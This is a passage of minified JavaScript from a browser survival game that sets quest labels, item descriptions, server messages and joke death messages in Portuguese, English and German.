                    document.getElementById("survive20min_3").innerHTML = "Survive without losing life",
                    document.getElementById("treasure_chest_4").innerHTML = " Open 5 treasure chests",
                    document.getElementById("dont_hit_5").innerHTML = " Be peaceful",
                    document.getElementById("bread_6").innerHTML = " Collect 100 bread in deep winter",
                    document.getElementById("winter_7").innerHTML = " After 1 day, survive in winter";
                for (var e = 0; e < 7; e++)
                    document.getElementById("claim_reward_" + e).innerHTML = "CLAIM REWARD!";
                document.getElementById("quit_chronoquest").innerHTML = " QUIT",
                    We[Be.HAND] = ["mão"],
                    We[Be.GROUND] = ["terra", "está sujo!"],
                    We[Be.SAND] = ["areia", "entrou nos meus olhos!"],
                    We[Be.WOOD] = ["madeira", "você não pode pegar o suficiente disso!"],
                    We[Be.STONE] = ["pedra", "também chamado rocha"],
                    We[Be.GOLD] = ["ouro", "seja generoso, dê para outros"],
                    We[Be.DIAMOND] = ["diamante", "o que você irá fazer com isso?"],
                    We[Be.AMETHYST] = ["ametista", "é mauve como lapa"],
                    We[Be.FLOUR] = ["farinha", "usada na cozinha"],
                    We[Be.COOKIE] = ["biscoito", "biscoito da vovó", "comida: 50"],
                    We[Be.CAKE] = ["bolo", "bolo dos sonhos para gourmets", "comida: 100"],
                    We[Be.MEAT] = ["carne crua", "você pode cozinhar na fogueira", "envenenamento por comida: 10", "comida: 15"],
                    We[Be.COOKED_MEAT] = ["carne assada", "um mal passado, por favor", "comida: 35"],
                    We[Be.FOODFISH] = ["peixe cru", "eu acho que ainda está vivo", "causa envenenamento por comida: 10", "comida: 18"],
                    We[Be.FOODFISH_COOKED] = ["peixe assado", "com limão é perfeito", "comida: 35"],
                    We[Be.BREAD] = ["pão", "um excelente pão francês", "é a moeda do mercado", "comida: 15"],
                    We[Be.SANDWICH] = ["sanduíche", "saboroso com rissol de krabby", "comida: 100"],
                    We[Be.CANDY] = ["doces", "apenas para crianças!", "comida: 100"],
                    We[Be.SUGAR_CAN] = ["cana-de-açúcar", "prove, é delicioso!", "comida: 100"],
                    We[Be.GARLAND] = ["pisca-pisca", "decoração perfeita de telhado"],
                    We[Be.SEED] = ["sementes de berries", "cresce como berrie", "nasce em: 2min", "cresce em: 55s", "precisa de água em: 3min 20s", "durabilidade: 700", "tempo de vida: 8 dias"],
                    We[Be.PLANT] = ["berry", "Berry saborosa!", "comida: 10"],
                    We[Be.WHEAT_SEED] = ["semente de trigo", "cresce como trigo", "nasce em: 2min", "cresce em: 16s", "precisa de água em: 2min", "durabilidade: 700", "tempo de vida: 8 days"],
                    We[Be.WILD_WHEAT] = ["planta selvagem", "vira farinha quando coloca em um moinho de vento"],
                    We[Be.PUMPKIN_SEED] = ["semente de abóbora", "cresce como abóbora", "nasce em: 2min 40s", "cresce em: 2min", "precisa de água em: 2min", "durabilidade: 700", "tempo de vida: 8 dias"],
                    We[Be.PUMPKIN] = ["abóbora", "é a lembrança do halloween", "comida: 30"],
                    We[Be.GARLIC_SEED] = ["semente de alho", "muito perigoso para vampiros", "dano: 20", "nassce: 4min", "cresce em: 1min 10s", "precisa de água em: 1min 40s", "durabilidade: 700", "tempo de vida: 8 dias"],
                    We[Be.GARLIC] = ["alho", "cura você e reduz o frio", "comida: 14", "cura ao longo do tempo: 30", "efeito: 1"],
                    We[Be.THORNBUSH_SEED] = ["semente de mato de espinhos", "pode dar dano nos seus inimigos", "dano: 20", "nasce em: 4min", "cresce em: 15s", "precisa de água em: 3min", "durabilidade: 1000", "tempo de vida: 8 days"],
                    We[Be.THORNBUSH] = ["mato de espinhos", "pica!"],
                    We[Be.PLOT] = ["pote", "sério, use isso", "com esse GMO fertilize suas plantas", "vai crescer mais rápido e com menos água", "durabilidade: 2000"],
                    We[Be.ICE] = ["gelo", "útil para fazer bolo e água"],
                    We[Be.SPANNER] = ["chave inglesa", "para reparar portas, muros e muros com espinho", "dano: 2"],
                    We[Be.FUR_WOLF] = ["pele de lobo", "cachorro? mas onde está o cachorro?!"],
                    We[Be.FUR] = ["pele de coelho", "o coelho era tão fofo..."],
                    We[Be.SPECIAL_FUR] = ["pele pura", "você é uma fábrica de pão"],
                    We[Be.SPECIAL_FUR_2] = ["pele negra", "você está pronto para fazer algo errado"],
                    We[Be.FUR_WINTER] = ["pele de inverno", "ele só queria um abraço"],
                    We[Be.SCALES] = ["escala", "é pequeno como peixe!"],
                    We[Be.KRAKEN_SKIN] = ["pele do kraken", "você não está com medo?"],
                    We[Be.FIRE] = ["fogueira", "esquenta você!", "durabilidade: 150", "tempo de vida: 2min"],
                    We[Be.BIG_FIRE] = ["fogueira grande", "te esquenta por mais tempo!", "durabilidade: 400", "tempo de vida: 6min"],
                    We[Be.WORKBENCH] = ["mesa de trabalho", "muito útil para fazer todos os objetos"],
                    We[Be.CORD] = ["linha", "usada para fazer chapéus e mochila"],
                    We[Be.BLUE_CORD] = ["linha de diamante", "usada para fazer chapéus especiais"],
                    We[Be.CHEST] = ["baú", "permite que você guarde itens", "durabilidade: 500"],
                    We[Be.SWORD_WOOD] = ["espada de madeira", "isso funciona?", "dano: 12", "dano em construções: 4"],
                    We[Be.SWORD] = ["espada de pedra", "seja legal com outros", "dano: 19", "dano em construções: 6"],
                    We[Be.SWORD_GOLD] = ["espada de ouro", "rei da floresta", "dano: 22", "dano em construções: 7"],
                    We[Be.SWORD_DIAMOND] = ["espada de diamante", "você pode sentir o poder", "dano: 24", "dano em construções: 8"],
                    We[Be.PIRATE_SWORD] = ["espada de pirata", "AYYYYY!", "alcança mais distância que a espada normal", "dano: 24", "dano em construções: 8"],
                    We[Be.SWORD_AMETHYST] = ["espada de ametista", "mauve é a cor mais bonita do mundo", "dano: 27", "dano em construções: 9"],
                    We[Be.DRAGON_SWORD] = ["espada do dragão", "sem piedade!", "dano: 30", "dano em construções: 10"],
                    We[Be.DRAGON_SPEAR] = ["lança do dragão", "mate todos eles!", "dano: 22", "dano em construções: 6"],
                    We[Be.PICK_WOOD] = ["picareta de madeira", "pode coletar apenas madeira e pedra", "dano: 1"],
                    We[Be.PICK_STONE] = ["picareta de pedra", "pode coletar madeira, pedra e ouro", "dano: 2"],
                    We[Be.PICK_GOLD] = ["picareta de ouro", "pode coletar diamante", "dano: 3", "dano em construções: 1"],
                    We[Be.PICK_DIAMOND] = ["picareta de diamante", "pode coletar tudo", "dano: 4", "dano em construções: 1"],
                    We[Be.PICK_AMETHYST] = ["picareta de ametista", "pode coletar tudo, parece fantastico!", "dano: 5", "dano em construções: 1"],
                    We[Be.HAMMER] = ["martelo de pedra", "útil para destruir construções", "não funciona bem no diamante e na ametista", "dano: 2", "dano em construções: 20"],
                    We[Be.HAMMER_GOLD] = ["martelo de ouro", "útil para destruir construções", "não funciona bem na ametista", "dano: 3", "dano em construções: 30"],
                    We[Be.HAMMER_DIAMOND] = ["martelo de diamante", "útil para destruir construções", "dano: 4", "dano em construções: 40"],
                    We[Be.HAMMER_AMETHYST] = ["martelo de ametista", "útil para destruir construções", "dano: 5", "dano em construções: 50"],
                    We[Be.SUPER_HAMMER] = ["super martelo", "você planeja destruir o mundo?", "dano: 12", "dano em construções: 70"],
                    We[Be.WOOD_SPEAR] = ["lança de madeira", "parece um graveto de madeira mas pica.", "dano: 10", "dano em construções: 2"],
                    We[Be.SPEAR] = ["lança de pedra", "o começo da evolução!", "dano: 14", "dano em construções: 4"],
                    We[Be.GOLD_SPEAR] = ["lança de ouro", "cuidado, pica!", "dano: 15", "dano em construções: 5"],
                    We[Be.DIAMOND_SPEAR] = ["lança de diamante", "você está pronto para matar um dragão", "Dano: 17", "dano em construções: 5"],
                    We[Be.AMETHYST_SPEAR] = ["lança de ametista", "dragões não te amedrontam", "Dano: 18", "dano em construções: 6"],
                    We[Be.SHOVEL] = ["pá de pedral", "cave o chão para pegar terra, areia e gelo", "você também pode pegar minerais", "dano: 2"],
                    We[Be.SHOVEL_GOLD] = ["pá de ouro", "cave o chão para pegar terra, areia e gelo", "você também pode pegar minerais", "dano: 3", "dano em construções: 1"],
                    We[Be.SHOVEL_DIAMOND] = ["pá de diamante", "cave o chão para pegar terra, areia e gelo", "você também pode pegar minerais", "dano: 4", "dano em construções: 1"],
                    We[Be.SHOVEL_AMETHYST] = ["pá de ametista", "cave o chão para pegar terra, areia e gelo", "você também pode pegar minerais", "dano: 5", "dano em construções: 1"],
                    We[Be.WOOD_HELMET] = ["capacete de madeira", "melhor que nada", "defesa de jogadores: 1", "defesa de animais: 4"],
                    We[Be.STONE_HELMET] = ["capacete de pedra", "você está pronto para a batalha!", "defesa de jogadores: 2", "Animals Defense: 8"],
                    We[Be.GOLD_HELMET] = ["capacete de ouro", "AKA o capacete dos selvagens", "defesa de jogadores: 4", "defesa de animais: 13"],
                    We[Be.DIAMOND_HELMET] = ["capacete de diamante", "não se precipite tanto", "defesa de jogadores: 5", "defesa de animais: 19"],
                    We[Be.AMETHYST_HELMET] = ["capacete de ametista", "você não tem medo de mais nada", "defesa de jogadores: 6", "defesa de animais: 23"],
                    We[Be.DRAGON_HELMET] = ["capacete do dragão", "você vai conquistar o mundo", "defesa de jogadores: 8", "defesa de animais: 27"],
                    We[Be.EXPLORER_HAT] = ["chapéu de explorador", "animais não vão te atacar", "mas não faça barulho!", "quente fora da água"],
                    We[Be.CHRISTMAS_HAT] = ["gorro de natal", "Oh, oh, oh, feliz natal", "quente fora da água e neve"],
                    We[Be.ELF_HAT] = ["chapéu de elfo", "não deixe-se ser explorado, seu pequeno elfo de neve!", "quente fora da água e neve"],
                    We[Be.HOOD] = ["capuz", "você é um trapaceiro", "você pode roubar alguém apenas se", "1) é de noite", "2)você não está segurando nada", "3) se você n foi tocado por 5 segundos", "4) você não está perto de uma fogueira", "5) seu alvo não está com equipamento camponês", "quente fora da água e na neve"],
                    We[Be.EARMUFFS] = ["protetor de orelhas", "algum tipo de chapka pequena.", "quente fora da água e neve"],
                    We[Be.COAT] = ["Chapka", "também chamado de casaco.", "esquenta fora da água e na neve", "muito quente"],
                    We[Be.CAP_SCARF] = ["Chapéu de inverno", "Muito confortável", "Muito quente"],
                    We[Be.PEASANT] = ["túnica", "suas plantas crescem rápido", "quente fora da água e na neve"],
                    We[Be.WINTER_HOOD] = ["capuz de inferno", "você só pode roubar alguém se", "é de noite", "-você não está segurando nada", "- se você não foi tocado por 4 segundos", "- você não está perto de uma fogueira", "-seu alvo não está com equipamento de camponês de inverno", "esquenta fora da água e na neve"],
                    We[Be.WINTER_PEASANT] = ["camponês de inverno", "suas plantas crescem rápido", "quente fora da água e na neve"],
                    We[Be.DIVING_MASK] = ["máscara de mergulho", "você é rápido na água", "quente na água", "defesa de jogadores: 2, defesa de animais: 8"],
                    We[Be.SUPER_DIVING_SUIT] = ["super máscara de mergulho", "você é muito rápido na água", "quente na água", "defesa de jogadores: 4, defesa de animais: 16"],
                    We[Be.DRAGON_ORB] = ["esfera do dragão", "dado na questt"],
                    We[Be.DRAGON_HEART] = ["coração de dragão", "torna você num fantasmas na morte!", "você é um fantasma por 60 segundos", "ache uma pedra da ressurreição"],
                    We[Be.GEMME_GREEN] = ["pedra verde", "você não vai trapacear, promete?"],
                    We[Be.GEMME_ORANGE] = ["pedra laranja", "apenas um pirata de verdade pode achar-lo!"],
                    We[Be.GEMME_BLUE] = ["pedra azul", "para pessoas muito gentis"],
                    We[Be.CROWN_GREEN] = ["coroa verde", "você se regenera muito rápido", "regenera ao longo do tempo: 40", "defesa de jogadores: 4, defesa de animais: 16"],
                    We[Be.CROWN_ORANGE] = ["coroa laranja", "de repente você se sente muito sortudo", "defesa de jogadores: 4, defesa de animais: 16"],
                    We[Be.CROWN_BLUE] = ["coroa azul", "quando você morrer, você vira um fantasma", "você perderá sua arma", "defesa de jogadores: 4, defesa de animais: 16"],
                    We[Be.BUCKET_FULL] = ["balde", "útil para encher um poço", "um balde equivale a doze garrafas"],
                    We[Be.BUCKET_EMPTY] = ["balde vazio", "você precisa encher esse balde perto de uma fonte de água"],
                    We[Be.BOTTLE_FULL] = ["garrafa", "permite que você beba água em qualquer lugar", "água: 50"],
                    We[Be.BOTTLE_EMPTY] = ["garrafa vazia", "você pode encher essa garrafa perto de uma fonte de água"],
                    We[Be.WATERING_CAN] = ["regador vazio", "você deve enche-lo com uma fonte de água para usa-lo"],
                    We[Be.WATERING_CAN_FULL] = ["regador", "permite regar as plantas", "dano: 1"],
                    We[Be.BAG] = ["mochila", "mais espaço para seus itens!"],
                    We[Be.PAPER] = ["papel", "usado para fazer o livro"],
                    We[Be.BOOK] = ["livro", "permite reduzir consideradamente o tempo de construções", "mas precisa está equipado para fucionar", "dano: 1"],
                    We[Be.BANDAGE] = ["bandagem", "recupera sua vida mais rapidamente", "Heal over time: 30", "Effect: 5"],
                    We[Be.LOCK] = ["fechadura", "permite você trancar seu baú"],
                    We[Be.LOCKPICK] = ["chave", "permite destrancar um baú"],
                    We[Be.TOTEM] = ["Totem", "permite você criar um time", "compartilha portas e baús", "edifício prejudicial não quer machucar seu amigo"],
                    We[Be.BRIDGE] = ["ponte", "muito útil na água", "permite você beber sem se afogar", "anda rápido na água"],
                    We[Be.SIGN] = ["placa", "deixe uma mensagem para outros", "durabilidade: 200"],
                    We[Be.ROOF] = ["telhado", "esconde você um pouco e te esquenta!"],
                    We[Be.WELL] = ["poço", "permite encher garrafas", "durabilidade: 1000"],
                    We[Be.WALL] = ["muro de madeira", "você sabia que o muro dança?", "durabilidade: 1000"],
                    We[Be.STONE_WALL] = ["muro de pedra", "é um pocu mais sério.", "durabilidade: 1500"],
                    We[Be.GOLD_WALL] = ["muro de ouro", "ouro nos seus muros? é muito chamativo.", "durabilidade: 2000"],
                    We[Be.DIAMOND_WALL] = ["muro de diamante", "tão brilhoso, veja seus olhos", "durabilidade: 2500"],
                    We[Be.AMETHYST_WALL] = ["muro de ametista", "você está muito assustado de sair!", "durabilidade: 3000"],
                    We[Be.SPIKE] = ["espiga de madeira", "pode dar dano nos seus inimigos", "dano: 10, dano no acerto: 2", "durabilidade: 150"],
                    We[Be.STONE_SPIKE] = ["espiga de pedra", "eu não quero ser seu inimigo.", "dano: 20", "dano no acerto: 3", "durabilidade: 300"],
                    We[Be.GOLD_SPIKE] = ["espiga de ouro", "você é tão cruel.", "dano: 30", "dano no acerto: 3", "durabilidade: 600"],
                    We[Be.DIAMOND_SPIKE] = ["espiga de diamante", "você não gosta de ter companhia.", "dano: 40", "dano no acerto: 4", "durabilidade: 1200"],
                    We[Be.AMETHYST_SPIKE] = ["espiga de ametista", "o que diabos seu vizinhos fizeram para você?", "dano: 50", "dano no acerto: 4", "durabilidade: 2400"],
                    We[Be.WOOD_DOOR] = ["porta de madeira", "pode ser aberta ou fechada por você ou seus amigos", "durabilidade: 1000"],
                    We[Be.STONE_DOOR] = ["porta de pedra", "uma porta mais forte é mais sério", "durabilidade: 1500"],
                    We[Be.GOLD_DOOR] = ["porta de ouro", "você está re-construindo o el dorado?", "durabilidade: 2000"],
                    We[Be.DIAMOND_DOOR] = ["porta de diamante", "para uma casa brilhante", "durabilidade: 2500"],
                    We[Be.AMETHYST_DOOR] = ["porta de ametista", "é a sua casa um lugar trancado seguro?", "durabilidade: 3500"],
                    We[Be.FURNACE] = ["fornalha", "esquenta você", "consumi madeira em todo 5 segundos", "durabilidade: 1000"],
                    We[Be.WINDMILL] = ["moinho de vento", "pode produzir farinha do trigo", "demora 5 segundos para fazer farinha", "dá pontos ao trabalhar", "durabilidade: 2000"],
                    We[Be.BREAD_OVEN] = ["forno de pão", "permite fazer pão feito de farinha", "demora 10 segundos para fazer pão", "dá pontos ao trabalhar", "durabilidade: 2000"],
                    We[Be.RESURRECTION] = ["pedra da ressurreição", "é mágico", "te ressuscita se você for um fantasmas", "você vai perder sua arma", "durabilidade 200: 200"],
                    We[TEXT.YOU_CANNOT_JOIN] = "você não pode entrar no servidor",
                    We[TEXT.KICKED] = "kickado: ",
                    We[TEXT.KEY_ALREADY] = "sua chave está em uso por outra pessoa",
                    We[TEXT.KEY_WRONG] = "sua chave está errada",
                    We[TEXT.OLD_VERSION] = "você tem uma versão velha, limpe seu cache",
                    We[TEXT.NO_MORE_RESOURCES] = "não tem mais recursos",
                    We[TEXT.SURVIVED_1DAY] = "você sobreviveu 1 dia",
                    We[TEXT.SURVIVED] = "você sobreviveu ",
                    We[TEXT.DAYS] = " dias",
                    We[TEXT.DEAD_SAD] = "você está morto ;-;",
                    We[TEXT.SPAM_ME] = "servidor não pôde achar um local de spawn! spam o botão de play!",
                    We[TEXT.SPAM_ME2] = "servidor está cheio! spam o botão de play!",
                    We[TEXT.EMPTY] = "não tem recursos",
                    We[TEXT.INV_FULL] = "inventário está cheio (botão direito para deletar itens)",
                    We[TEXT.DEAD] = " está morto",
                    We[TEXT.WRONG_TOOL] = "essa não é a ferramenta certa",
                    We[TEXT.JOIN_TEAM] = "você entrou no time",
                    We[TEXT.YOU_DEAD] = "você está morto",
                    We[TEXT.JOINED_TEAM] = "entrou no time",
                    We[TEXT.TEAM_DESTROYED] = "seu time foi destruido",
                    We[TEXT.LEFT_TEAM] = "você saiu do time",
                    We[TEXT.LEFT_TEAM2] = " saiu do time",
                    We[TEXT.TOKEN] = "alguém roubou sua ficha :>",
                    We[TEXT.CHOOSE] = "escolha um servidor",
                    We[TEXT.PLAYERS] = "jogadores",
                    We[TEXT.TOTAL_PLAYERS] = "jogadores totais",
                    We[TEXT.TOTAL_MODE] = "jogadores nesse modo",
                    We[TEXT.COMMING_SOON] = "Coming soon...",
                    document.getElementById("nickname_input").placeholder = "Apelido",
                    n[0] = ["você morreu sem motivo"],
                    n[1] = ["você morreu de fome, como o jogo diz"],
                    n[2] = ["você morreu de frio. tão triste", "você pegou hipotermia na próxima vez, tente sentar numa fogueira em vez disso."],
                    n[3] = ["um jogador te matou dizendo a você para matar..'", "você foi morto por um jogador. não se preocupe, aquele jogador morrerá também, eventualmente."],
                    n[4] = ["você ficou muito perto de uma fogueira e queimou até a morte. má ideia.", "você morreu por um incêndio. fogueira te machuca. vá escrever uma história sobre isso."],
                    n[5] = ["seu corpo vai virar um ninho para ovos de aranhas", "uma aranha te matou. pelo menos não era um coelho."],
                    n[6] = ["o lobo não vão morrer de fome depois te te comer", "eles não são cachorros. lobos não gostam de ser que nem animais de estimação."],
                    n[7] = ["a raposa era muito rápida para você", "a raposa te tornou uma caixa. desde quando os animais tem poderes mágicos?"],
                    n[8] = ["o urso só queria um abraço.", " o urso era muito nu. eu não sinto muito."],
                    n[9] = ["você foi queimado por um dragão. tão triste..", "você foi esmagado por um dragão.. ser esmagado é uma maneira horrível de morrer."],
                    n[10] = ["você pulou em um muro com espinhos. não é uma boa ideia...", "você foi morto por um muro com espinhos. muitas pessoas são sensíveis o bastante para não tocar em coisas pontudas."],
                    n[11] = ["até fantasmas podem morrer.", "você falhou para ser ressuscitado. This is a game, so you go to life after you die, so..."],
                    n[12] = ["uma bactéria da sua comida crua te matou esse jogo é definitivamente muito díficil.", "você matou a carne crua. a carne crua te matou também."],
                    n[13] = ["você morreu de sede. melhor beber sua própria urina."],
                    n[14] = ["você sabia que você morre afogado? agora você sabe."],
                    n[15] = ["não se preocupe, as piranhas acham você saboroso.", "fato engraçado: Piranhas comem pessoas. incluindo você."],
                    n[16] = ["LapaMauve não planeja você matar o kraken", "um kraken comeu seu esqueleto."],
                    n[17] = ["sua pele caindo aos pedaços, o sol te matou."],
                    n[18] = ["o alho amarzenado em seus bolsos ferveu seu cérebro."],
                    n[19] = ["como vampiro, não chegue perto do alho."],
                    n[20] = ["você comeu alho como vampiro, o que você esperava?"],
                    n[21] = ["seu corpo se enroscou nos espinhos. quando você tenta escapar, sua pele sai e seu coração para de bater."],
                    ZOMBIE_GRUMBLE = "Uuunnnggg",
                    ZOMBIE_GRUMBLES = ["Uuunnnggg... estou morrendo de fome", "preciso do seu cerébro Uuunnnggg...", "carne fresca aqui... Uuunnnggg", "Uuunnnggg... você parece saboroso", "Uuunnnggg...", "Eat... uuunnnggg...", "consigo sentir o cheiro de sangue... Uuunnnggg"]
            }
            function Re() {
                We[Be.DRAGON_CUBE] = ["You feel a great power emanating from this orb"],
                    n[22] = ["This crab, though frightening in nature, pinched your fingertips so hard that you had a heart attack."],
                    We[Be.CRAB_STICK] = ["Crab sticks", "Oh, yeah? Is there crab in the crab sticks?", "Food: 20"],
                    We[TEXT.BACK_TO_THE_GAME] = " BACK TO THE GAME",
                    We[TEXT.TWITTER] = " Share on Twitter",
                    We[TEXT.FACEBOOK] = " Share on Facebook",
                    We[TEXT.KIT_NEXT] = "You can buy items on the shop in the next game with your points",
                    We[TEXT.POINTS] = "points",
                    We[TEXT.SCORE] = "Score",
                    We[TEXT.KILL] = "Kill",
                    We[TEXT.DAYS_SURVIVED] = "Days survived",
                    We[TEXT.MODE_FREE] = "Building method: Free. Press G to change",
                    We[TEXT.MODE_GRID] = "Building method: Grid. Press G to change",
                    We[Be.CRAB_LOOT] = ["Crab Claw", "Crab claws can also be eaten", "Food: 10"],
                    We[Be.CRAB_SPEAR] = ["Crab Spear", "Allow you to calm crabs, and heal them", "Damage: 14", "Building Damage: 4"],
                    We[Be.CROWN_CRAB] = ["Crab Helmet", "You are the king of crabs!", "Crabs follow you", "They can't hit you and you can't hit them", "Players Defense: 4", "Animals Defense: 13"],
                    We[Be.BED] = ["Bed", "Relax in this confortable bed", "You are less cold, less thirsty, and less hungry", "You will be cured faster", "Durability: 400"],
                    document.getElementById("typequest").innerHTML = "Chrono Quests",
                    document.getElementById("timeremainingquest").innerHTML = "Time Remaining",
                    document.getElementById("constraintquest").innerHTML = " Constraints",
                    document.getElementById("claim_rewards").innerHTML = " Claim rewards",
                    document.getElementById("rewardquest").innerHTML = " Reward",
                    document.getElementById("killdragon_1").innerHTML = " Collect 1 dragon heart",
                    document.getElementById("amethyst_2").innerHTML = " Gather 1 amethyst",
                    document.getElementById("survive20min_3").innerHTML = "Survive without losing life",
                    document.getElementById("treasure_chest_4").innerHTML = " Open 5 treasure chests",
                    document.getElementById("dont_hit_5").innerHTML = " Be peaceful",
                    document.getElementById("bread_6").innerHTML = " Collect 100 bread in deep winter",
                    document.getElementById("winter_7").innerHTML = " After 1 day, survive in winter";
                for (var e = 0; e < 7; e++)
                    document.getElementById("claim_reward_" + e).innerHTML = "CLAIM REWARD!";
                document.getElementById("quit_chronoquest").innerHTML = " QUIT",
                    We[Be.HAND] = ["Hand"],
                    We[Be.GROUND] = ["Boden", "Dreckig!"],
                    We[Be.SAND] = ["Sand", "Ich habe es in meine Augen bekommen!"],
                    We[Be.WOOD] = ["Holz", "Du kannst niemals zu viel haben!"],
                    We[Be.STONE] = ["Stein", "Auch Fels gennant"],
                    We[Be.GOLD] = ["Gold", "Sei großzügig, gib anderen etwas ab "],
                    We[Be.DIAMOND] = ["Diamant", "Was wirst du daraus machen?"],
                    We[Be.AMETHYST] = ["Amethyst", "Es ist Mauve farbend, genauso wie Lapa"],
                    We[Be.FLOUR] = ["Mehl", "wird fürs Backen gebraucht"],
                    We[Be.COOKIE] = ["Keks", "Ein prächtiger Keks von Großmutter", "Essen: 50"],
                    We[Be.CAKE] = ["Ein Kuchen", "Perfekter Kuchen für Gourmets", "Essen: 100"],
                    We[Be.MEAT] = ["rohes Fleisch", "Du kannst es mit einem Feuer braten", "verursacht Lebensmittelvergiftung: 10", "Essen: 15"],
                    We[Be.COOKED_MEAT] = ["gebratenes Fleisch", "Einmal blutiges Steak, bitte", "Essen: 35"],
                    We[Be.FOODFISH] = ["roher Fisch", "Ich glaube es lebt noch", "verursacht Lebensmittelvergiftung: 10", "Essen: 18"],
                    We[Be.FOODFISH_COOKED] = ["gebratener Fisch", "Mit einer Zitrone ist es perfekt", "Essen: 35"],
                    We[Be.BREAD] = ["Brot", "Ein vorzügliches französiches Brot", "Es wird als Währung im Markt benutzt", "Essen: 15"],
                    We[Be.SANDWICH] = ["Sandwich", "Schmeckt wie Krabbenburger", "Essen: 100"],
                    We[Be.CANDY] = ["Süßigkeiten", "Nur für Kinder!", "Essen: 100"],
                    We[Be.SUGAR_CAN] = ["Zuckerstange", "Probier mal, es schmeckt hervorragend", "Essen: 100"],
                    We[Be.GARLAND] = ["Girlande", "perfekter Schmuck für Dächer"],
                    We[Be.SEED] = ["Beeren Saatgut", "Wird eine Beere", "Entstehung: 2min", "Wachstum: 55s", "Wasserbedarf: 3min 20s", "Haltbarkeit: 700", "Lebenszeit: 8 Tage"],
                    We[Be.PLANT] = ["Beere", "Beeren lecker!", "Essen: 10"],
                    We[Be.WHEAT_SEED] = ["Weizen Saatgut", "Wird zu Weizen", "Entstehung: 2min", "Wachstum: 16s", "Wasserbedarf: 2min", "Haltbarkeit: 700", "Lebenszeit: 8 Tage"],
                    We[Be.WILD_WHEAT] = ["Wildes Weizen", "Wenn es in eine Windmühle platziert wird, wird es zu Mehl"],
                    We[Be.PUMPKIN_SEED] = ["Kürbis Saatgut", "Wird zu Kürbis", "Entstehung: 2min 40s", "Wachstum: 2min", "Wasserbedarf: 2min", "Haltbarkeit: 700", "Lebenszeit: 8 Tage"],
                    We[Be.PUMPKIN] = ["Kürbis", "Es erinnert mich an Halloween", "Essen: 30"],
                    We[Be.GARLIC_SEED] = ["Knoblauch Saatgut", "Sehr gefährlich für Vampire", "Schaden: 20", "Entstehung: 4min", "Wachstum: 1min 10s", "Wasserbedarf: 1min 40s", "Haltbarkeit: 700", "Lebenszeit: 8 Tage"],
                    We[Be.GARLIC] = ["Knoblauch", "Heilt dich und hält die Kälte fern", "Essen: 14", "Heilung über Zeit: 30", "Effekt: 1"],
                    We[Be.THORNBUSH_SEED] = ["Dornenbusch Saatgut", "Kann deinen Gegnern Schaden zufügen", "Schaden: 20", "Entstehung: 4min", "Wachstum: 15s", "Wasserbedarf: 3min", "Haltbarkeit: 1000", "Lebenszeit: 8 Tage"],
                    We[Be.THORNBUSH] = ["Dornenbusch", "Es sticht!"],
                    We[Be.PLOT] = ["Topf", "Ernsthaft, benutz es", "Mit diesem GMO dünger deine Pflanzen", "lässt sie schneller wachsen und reduziert den Wasserverbrauch", "Haltbarkeit: 2000"],
                    We[Be.ICE] = ["Eis", "Nützlich um Kuchen und Wasser herzustellen"],
                    We[Be.SPANNER] = ["Schraubenschlüssel", "Es kann Wände, Türen und Stacheln reparieren", "Schaden: 2"],
                    We[Be.FUR_WOLF] = ["Wolfsfell", "Welpe? Aber wo ist der Welpe?!"],
                    We[Be.FUR] = ["Hasenfell", "Der Hase war so süß..."],
                    We[Be.SPECIAL_FUR] = ["Klares Fell", "Du bist eine Brotfabrik"],
                    We[Be.SPECIAL_FUR_2] = ["Dunkles Fell", "Du machst dich bereit etwas falsches zu vollführen"],
                    We[Be.FUR_WINTER] = ["Winter Fell", "Diese Tiere wollten nur eine Umarmung..."],
                    We[Be.SCALES] = ["Schuppen", "Es riecht wie Fisch!"],
                    We[Be.KRAKEN_SKIN] = ["Kraken Haut", "Warst du nicht zu ängstlich?"],
                    We[Be.FIRE] = ["Lagerfeuer", "Wärmt dich!", "Haltbarkeit: 150", "Lebensdauer: 2min"],
                    We[Be.BIG_FIRE] = ["Großes Lagerfeuer", "Wärmt dich länger!", "Haltbarkeit: 400", "Lebensdauer: 6min"],
                    We[Be.WORKBENCH] = ["Werkbank", "Sehr nützlich um allerlei Sachen herzustellen"],
                    We[Be.CORD] = ["Faden", "Wird benötigt um Mützen und Rucksäcke herzustellen  "],
                    We[Be.BLUE_CORD] = ["Diamant Faden", "Wird für spezielle Mützen gebraucht"],
                    We[Be.CHEST] = ["Truhe", "Damit kannst du Gegenstände lagern", "Haltbarkeit: 500"],
                    We[Be.SWORD_WOOD] = ["Holzschwert", "Funktioniert das?", "Schaden: 12", "Schaden an Gebäuden: 4"],
                    We[Be.SWORD] = ["Steinschwert", "Sei nett zu Anderen", "Schaden: 19", "Schaden an Gebäuden: 6"],
                    We[Be.SWORD_GOLD] = ["Goldschwert", "König des Waldes", "Schaden: 22", "Schaden an Gebäuden: 7"],
                    We[Be.SWORD_DIAMOND] = ["Diamantschwert", "Du kannst die Kraft spüren", "Schaden: 24", "Schaden an Gebäuden: 8"],
                    We[Be.PIRATE_SWORD] = ["Piratenschwert", "Ayyyyy!", "Hat eine höhere Reichweite als ein normales Schwert", "Schaden: 24", "Schaden an Gebäuden: 8"],
                    We[Be.SWORD_AMETHYST] = ["Amethystschwert", "Mauve ist die schönste Farbe der Welt", "Schaden: 27", "Schaden an Gebäuden: 9"],
                    We[Be.DRAGON_SWORD] = ["Drachenschwert", "Keine Gnade!", "Schaden: 30", "Schaden an Gebäuden: 10"],
                    We[Be.DRAGON_SPEAR] = ["Drachenspeer", "Töte sie alle!", "Schaden: 22", "Schaden an Gebäuden: 6"],
                    We[Be.PICK_WOOD] = ["Holzspitzhacke", "Kann nur Holz und Stein abbauen", "Schaden: 1"],
                    We[Be.PICK] = ["Steinspitzhacke", "Kann Holz, Stein und Gold abbauen", "Schaden: 2"],
                    We[Be.PICK_GOLD] = ["Goldspitzhacke", "Kann auch Diamanten abbauen", "Schaden: 3", "Schaden an Gebäuden: 1"],
                    We[Be.PICK_DIAMOND] = ["Diamantspitzhacke", "Kann alles abbauen", "Schaden: 4", "Schaden an Gebäuden: 1"],
                    We[Be.PICK_AMETHYST] = ["Amethystspitzhacke", "Kann alles abbauen, sieht außerdem gut aus!", "Schaden: 5", "Schaden an Gebäuden: 1"],
                    We[Be.HAMMER] = ["Steinhammer", "Nützlich um Gebäude zu zerstören", "Funktioniert nicht gut gegen Diamant oder Amethyst", "Schaden: 2", "Schaden an Gebäuden: 20"],
                    We[Be.HAMMER_GOLD] = ["Goldhammer", "Nützlich um Gebäude zu zerstören", "Funktioniert nicht gut gegen Amethyst", "Schaden: 3", "Schaden an Gebäuden: 30"],
